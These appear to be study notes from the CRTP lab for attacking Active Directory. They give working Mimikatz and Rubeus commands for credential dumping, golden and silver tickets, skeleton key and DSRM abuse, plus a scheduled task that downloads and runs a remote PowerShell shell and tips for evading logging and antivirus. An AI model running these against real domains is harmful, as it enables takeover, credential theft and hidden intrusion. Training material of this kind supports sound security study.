**Tricks**<br>
during enumration process focus on never use any script that can make any noise.<br>
or use any kind make a your enumration is unique like 4672(S): Special privileges assigned to new logon.<br>
or make spilke ☣️ Like the picture in the below <br>
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/46d17bd2-9ee7-467e-8473-217c829d3fa9)

> U can list the session and logged on users on the machines if you enumrate windows server less than 2019 if u a membership of domain admin group, but u will leave event 4624 and 4634 on all machines.<br>
> when u use paramter like check access on this case the request not send for all machines, it's just send to the high level machines like servers to check.<br>

# Privilege Escalation
- In an AD environment, there are multiple scenarios which lead to privilege escalation. We had a look at the following
  - Hunting for Local Admin access on other machines
  - Hunting for high privilege domain accounts (like a Domain Administrator)
- Let's also look for Local Privilege Escalation.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/5cbee3a5-a4ad-47b4-86d8-6298bccff44f)

***Privilege Escalation - Local***
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI as SYSTEM)
- Misconfigured Services
- DLL Hijacking and more
- NTLM Relaying a.k.a. Won't Fix
We can use below tools for complete coverage<br>
- PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Privesc: https://github.com/enjoiz/Privesc

# Services Issues using PowerUp<br>
We have Three types of service issues:<br>
1- Get services with unquoted paths and a space in their name.<br>
```Get-ServiceUnquoted -Verbose```<br>
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/1e52fa5c-f3f1-491a-805a-648657bc5d07)
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/4469bd8f-34e9-4cc4-aff4-fd92b504a01f)

2- Get services where the current user can write to its binary path or change arguments to the binary<br>
```Get-ModifiableServiceFile -Verbose```<br>
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/e0c6334b-5ff6-4c59-8707-e3fdfd8213b6)

3- Get the services whose configuration current user can modify.<br>
```Get-ModifiableService -Verbose```<br>


# Feature Abuse
- What we have been doing up to now (and will keep doing further in the class) is relying on features abuse.
- Features abuse are awesome as there are seldom patches for them and they are not the focus of security teams!
- One of my favorite features abuse is targeting enterprise applications which are not built keeping security in mind.
- On Windows, many enterprise applications need either Administrative privileges or SYSTEM privileges making them a great avenue for privilege escalation.

***Feature Abuse - Jenkins***
- Jenkins is a widely used Continuous Integration tool.
- There are many interesting aspects with Jenkins but for now we would limit our discussion to the ability of running system commands on Jenkins.
- There is a Jenkins server running on dcorp-ci (172.16.3.11) on port 8080.
- Apart from numerous plugins, there are two ways of executing commands on a Jenkins Master.
- If you have Admin access (default installation before 2.x), go to ```http://<jenkins_server>/script```
- In the script console, Groovy scripts could be executed.
>Groovy is a dynamic, object-oriented programming language for the Java Virtual Machine (JVM). It is designed to be concise, readable, and expressive, with syntax and features inspired by languages like Java, Python, and Ruby. Groovy scripts are programs or scripts written in the Groovy programming language.
```
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
- If you don't have admin access but could add or edit build steps in the
build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
```powershell –c <command>```
- Again, you could download and execute scripts, run encoded scripts and
more.

> Note :- Auto Logon feature its store the username and password on the registery so anyone can read it.

# Domain Enumeration - BloodHound
> BloodHound have two part the collector 'sharphond .ps1' that running to check the all of AD and give u file u open it in the second part called GUI.<br>
> The SharpHound toolset is specifically designed to collect data within an Active Directory <br>
> GUI draw to you a graph from the file that collect by the collectors.<br>
- Provides GUI for AD entities and relationships for the data collected by its ingestors.
- Uses Graph Theory for providing the capability of mapping shortest path for interesting things like Domain Admins.
https://github.com/BloodHoundAD/BloodHound
- There are built-in queries for frequently used actions.
- Also supports custom Cypher queries.
**Supply data to BloodHound:**<br>
```. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1```<br>
```Invoke-BloodHound -CollectionMethod All```<br>
or<br>
```SharpHound.exe```
- The generated archive can be uploaded to the BloodHound application.
- To avoid detections like ATA
```Invoke-BloodHound -CollectionMethod All -ExcludeDC```

# Lateral Movement - PowerShell Remoting
- Think of PowerShell Remoting (PSRemoting) as psexec on steroids but much more silent and super fast!
- PSRemoting uses Windows Remote Management (WinRM) which is Microsoft's implementation of WS-Management.
- Enabled by default on Server 2012 onwards with a firewall exception.
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).
- It is the recommended way to manage Windows Core servers.
- You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that.
- The remoting process runs as a high integrity process. That is, you get an elevated shell.
- One-to-One
- PSSession
  - Interactive
  - Runs in a new process (wsmprovhost)
  - Is Stateful
- Useful cmdlets
  - ```New-PSSession```
  - ```Enter-PSSession```
- One-to-Many
- Also known as Fan-out remoting.
- Non-interactive.
- Executes commands parallely.
- Useful cmdlets
  - ```Invoke-Command```
- Run commands and scripts on
  - multiple remote computers,
  - in disconnected sessions (v3)
  - as background job and more.
- The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers.
- Use ```–Credential``` parameter to pass username/password.

# PowerShell Remoting - Tradecraft
- PowerShell remoting supports the system-wide transcripts and deep script block logging.
- We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
```winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname```<br>
- We can also use winrm.vbs and COM objects of WSMan COM object -https://github.com/bohops/WSMan-WinRM

# Lateral Movement - Invoke-Mimikatz
- Mimikatz can be used to dump credentials, tickets, and many more interesting attacks!
- Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory.
  All the functions of mimikatz could be used from this script.
- The script needs administrative privileges for dumping credentials from local machine. Many attacks need specific privileges which are covered
  while discussing that attack.

# Lateral Movement - OverPass-The-Hash
- Over Pass the hash (OPTH) generate tokens from hashes or keys.
- Below doesn't need elevation.<br>
```Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash>/ptt```
- Below command needs elevation.<br>
```Rubeus.exe asktgt /user:administrator/aes256:<aes256keys> /opsec/createnetonly:C:\Windows\System32\cmd.exe /show /ptt```<br>
***What is Rubeus.exe?***
```
It is known for its capability to interact with Kerberos tickets in Windows environments. The tool is often used to perform Kerberos
ticket extraction, manipulation, and attacks against Kerberos authentication.

- Ticket Extraction: Rubeus can be used to extract Kerberos tickets from memory, including Ticket Granting Ticket (TGT)
and Ticket Granting Service (TGS) tickets.

- Pass-the-Ticket (PtT) Attacks: Rubeus supports pass-the-ticket attacks, allowing an attacker to use stolen Kerberos tickets to
authenticate to other services without knowing the user's password.

- Ticket Renewal and Ticket Renewal Attacks: Rubeus can renew Kerberos tickets, and it also supports attacks related to ticket renewal,
such as requesting and renewing TGTs.

- Ticket Request: The tool can be used to request TGTs and TGS tickets for specific users or services.

- Kerberoasting: Rubeus supports Kerberoasting attacks, which involve requesting service tickets for service accounts
and then offline brute-forcing the ticket to obtain the service account's plaintext password
```
# Lateral Movement - DCSync
- To extract credentials from the DC without code execution on it, we can use DCSync.
- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:<br>
```Invoke-Mimikatz -Command '"lsadump::dcsync/user:us\krbtgt"'SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"```
- By default, Domain Admins privileges are required to run DCSync.

# Offensive .NET - Introduction
- Currently, .NET lacks some of the security features implemented in System.Management.Automation.dll.
- Because of this, many Red teams have included .NET in their tradecraft.
- There are many open source Offensive .NET tools and we will use the ones that fit our attack methodology.

 # Offensive .NET - Tradecraft
- When using .NET (or any other compiled language) there are some challenges
  - Detection by countermeasures like AV, EDR etc.
  - Delivery of the payload (Recall PowerShell's sweet download-execute cradles)
  - Detection by logging like process creation logging, command line logging etc.
- We will try and address the AV detection and delivery of the payload as and when required during the class ;)
- You are on your own when the binaries that we share start getting detected by Windows Defender!

# Offensive .NET - Tradecraft - AV bypass
- We will focus mostly on bypass of signature based detection by Windows Defender.
- For that, we can use techniques like Obfuscation, String Manipulation etc.
- We can use DefenderCheck (https://github.com/matterpreter/DefenderCheck) to identify code and strings from a binary that Windows Defender may flag.
- This helps us in deciding on modifying the source code and minimal obfuscation.

>xcopy: is a command-line utility in Microsoft Windows used for copying files and directories from one location to another. The name "xcopy" stands for "extended copy," and it is an enhanced version of the standard copy command in Windows.<br>

>If executable download another executable the Windows Defender can catch this behavior so we can avoid that by using port forwarding to map it to local address by netsh after $null variable.<br>

![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/92469281-fe8e-42b4-b070-164716d77a44)

>netsh is a command-line utility in Microsoft Windows that allows users to configure and display various network-related settings. The term "netsh" stands for "network shell," and it provides a scripting interface to configure, monitor, and troubleshoot network components.

>When u find the user ceredentials is clear text like that ```Session: Service from 0``` thats mean this user is a used to run service and ```0``` means that is use to run service. <br>

>NTLM is devided to NT Hash + LM Hash.<br>
>```NT Hash```: is the hash of the password.<br>
>```LM Hash```: is the user password in upper case and divided to 7 part then calculate the hash of it.<br>

# Active Directory Domain Dominance
- There is much more to Active Directory than "just" the Domain Admin.
- Once we have DA privileges new avenues of persistence, escalation to EA and attacks across trust open up!
- Let's have a look at abusing trust within domain, across domains and forests and various attacks on Kerberos.

# About Kerberos
- Kerberos is the basis of authentication in a Windows Active Directory environment.
- Clients (programs on behalf of a user) need to obtain tickets from Key Distribution Center (KDC) which is a service running on the domain
  controller. These tickets represent the client's credentials.!
- Therefore, Kerberos is understandably a very interesting target of abuse!
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/07b4ffd7-a81f-4b43-8d66-7cb15104b1ea)

# Persistence - Golden Ticket
- A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket.
- Since user account validation is not done by Domain Controller (KDC service) until TGT is older than 20 minutes, we can use even
  deleted/revoked accounts.
- The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine.
- As a good practice, it is recommended to change the password of the krbtgt account twice as password history is maintained for the account.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/a041ea38-f435-4ae4-ac6d-33bef24758b7)

- Execute mimikatz on DC as DA to get krbtgt hash<br>
```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' –Computername dcorp-dc```
- On any machine<br>
```Invoke-Mimikatz -Command '"kerberos::golden/User:Administrator /domain:dollarcorp.moneycorp.local/sid:S-1-5-21-1874506631-3219952063-538504511/krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500/groups:512 /startoffset:0 /endin:600 /renewmax:10080/ptt"'```

![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/042218d8-45fa-46a8-a261-f76a6ce95feb)
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/b52d9832-fc5c-4ad4-9bb1-d6e42738e4fd)

- To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges (or a user that has replication rights on the
  domain object):<br>
```Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'```
- Using the DCSync option needs no code execution (no need to run ```Invoke-Mimikatz```) on the target DC.

# Persistence - Silver Ticket
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/09c714e5-9153-4d63-a55f-8cf07b8b9ae1)

- A valid TGS (Golden ticket is TGT).
- Encrypted and Signed by the hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.
- Services rarely check PAC (Privileged Attribute Certificate).
- Services will allow access only to the services themselves.
- Reasonable persistence period (default 30 days for computer accounts).
- Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
```Invoke-Mimikatz -Command '"kerberos::golden
/domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS/rc4:6f5b5acaf7433b3282ac22e21e62ff22/user:Administrator /ptt"'
```
- Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/c1dfbeda-852a-47ca-9df4-0f62caa434f6)
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/a6166f56-0146-4bf3-bafb-239f271772d9)
- There are various ways of achieving command execution using Silver tickets.
- Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-
1874506631-3219952063-538504511 /target:dcorp-
dc.dollarcorp.moneycorp.local /service:HOST
/rc4:6f5b5acaf7433b3282ac22e21e62ff22
/user:Administrator /ptt"'
```
- Schedule and execute a task.
 ```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local
/SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR
"powershell.exe -c 'iex (New-Object
Net.WebClient).DownloadString(''http://192.168.100.1:808
0/Invoke-PowerShellTcp.ps1''')'"
```
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN
"STCheck"
```
# Persistence – Skeleton Key
>Skeleton Key Technique:<br>
>The Skeleton Key attack involves injecting a "skeleton key" into a Windows domain controller. This skeleton key allows the attacker to bypass normal authentication
>processes and authenticate as any user without knowing their password.
>The idea is u inject some code in the Local Security Authority Server Service (LSASS)
- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
- All the publicly known methods are NOT persistent across reboots.
- Yet again, mimikatz to the rescue.
- Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
```
Invoke-Mimikatz -Command '"privilege::debug"
"misc::skeleton"' -ComputerName dcorp-
dc.dollarcorp.moneycorp.local
```
- Now, it is possible to access any machine with a valid username and password as "mimikatz"
```
Enter-PSSession –Computername dcorp-dc –credential
dcorp\Administrator
```
- In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```
> Note that above would be very noisy in logs - Service installation (Kernel mode driver).<br>
- Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.<br>

# Persistence – DSRM
- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
![image](https://github.com/7arbeyx01/CRTP_Notes/assets/18347638/0ec6e32b-ece4-45f2-b0ee-b6b8acc6795c)
- Dump DSRM password (needs DA privs)
 ```
Invoke-Mimikatz -Command '"token::elevate"
"lsadump::sam"' -Computername dcorp-dc
```
- Compare the Administrator hash with the Administrator hash of below command<br>
```Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc```
- First one is the DSRM local Administrator.
- Since it is the local administrator of the DC, we can pass the hash to authenticate.
- But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
```
Enter-PSSession -Computername dcorp-dc
New-ItemProperty
"HKLM:\System\CurrentControlSet\Control\Lsa\" -Name
"DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
- Use below command to pass the hash
```
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-
dc /user:Administrator
/ntlm:a102ad5753f4c441e3af31c97fad86fd
/run:powershell.exe"'
ls \\dcorp-dc\C$
```
